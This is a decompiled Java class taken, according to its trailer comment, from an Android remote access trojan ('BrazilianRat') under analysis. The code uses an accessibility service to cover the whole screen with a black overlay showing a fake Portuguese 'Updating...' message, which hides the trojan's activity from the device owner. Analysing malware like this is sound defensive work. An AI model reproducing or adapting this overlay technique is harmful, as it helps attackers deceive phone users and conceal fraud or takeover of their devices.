package com.irifix;

import android.content.Context;
import android.hardware.display.DisplayManager;
import android.os.Handler;
import android.os.Looper;
import android.util.DisplayMetrics;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.widget.ImageView;
import android.widget.TextView;

public class f {
  private static ImageView a;
  
  private static TextView b;
  
  private static Context c;
  
  private static Handler d;
  
  public static void a() {
    Handler handler = d;
    if (handler != null)
      handler.post(new Runnable() {
            public void run() {
              if (f.e() != null)
                f.e().setText("Atualização concluida!"); 
            }
          }); 
  }
  
  public static void a(Context paramContext) {
    c = (Context)AccService.a();
    if (c == null)
      return; 
    d = new Handler(Looper.getMainLooper());
    a = new ImageView(c);
    b = new TextView(c);
    ImageView imageView = a;
    if (imageView != null && b != null) {
      int i;
      imageView.setBackgroundColor(-16777216);
      WindowManager.LayoutParams layoutParams2 = new WindowManager.LayoutParams();
      layoutParams2.flags |= 0x100;
      layoutParams2.flags |= 0x200;
      layoutParams2.flags |= 0x8;
      layoutParams2.flags |= 0x20;
      layoutParams2.flags |= 0x80;
      layoutParams2.format = -3;
      layoutParams2.gravity = 48;
      layoutParams2.screenOrientation = 1;
      layoutParams2.type = 2032;
      DisplayMetrics displayMetrics = new DisplayMetrics();
      ((DisplayManager)paramContext.getSystemService("display")).getDisplay(0).getRealMetrics(displayMetrics);
      if (displayMetrics.widthPixels > displayMetrics.heightPixels) {
        i = displayMetrics.widthPixels;
      } else {
        i = displayMetrics.heightPixels;
      } 
      layoutParams2.width = i;
      if (displayMetrics.heightPixels > displayMetrics.widthPixels) {
        i = displayMetrics.heightPixels;
      } else {
        i = displayMetrics.widthPixels;
      } 
      layoutParams2.height = i;
      WindowManager.LayoutParams layoutParams1 = new WindowManager.LayoutParams();
      b.setText("Atualizando...");
      b.setTextColor(-1);
      b.setTextSize(1, 25.0F);
      layoutParams1.flags |= 0x8;
      layoutParams1.flags |= 0x20;
      layoutParams1.format = -3;
      layoutParams1.gravity = 17;
      layoutParams1.type = 2032;
      layoutParams1.width = -2;
      layoutParams1.height = -2;
      d.post(new Runnable(layoutParams2, layoutParams1) {
            public void run() {
              WindowManager windowManager = (WindowManager)f.c().getSystemService("window");
              windowManager.addView((View)f.d(), (ViewGroup.LayoutParams)this.a);
              windowManager.addView((View)f.e(), (ViewGroup.LayoutParams)this.b);
            }
          });
      try {
        Thread.sleep(1000L);
      } catch (InterruptedException interruptedException) {}
    } 
  }
  
  public static void b() {
    Handler handler = d;
    if (handler == null)
      return; 
    handler.post(new Runnable() {
          public void run() {
            WindowManager windowManager = (WindowManager)f.c().getSystemService("window");
            if (f.d() != null) {
              windowManager.removeViewImmediate((View)f.d());
              f.a((ImageView)null);
            } 
            if (f.e() != null) {
              windowManager.removeViewImmediate((View)f.e());
              f.a((TextView)null);
            } 
          }
        });
    d = null;
  }
}


/* Location:              /home/fahim/Desktop/BrazilianRat-dex2jar.jar!/com/irifix/f.class
 * Java compiler version: 6 (50.0)
 * JD-Core Version:       1.1.3
 */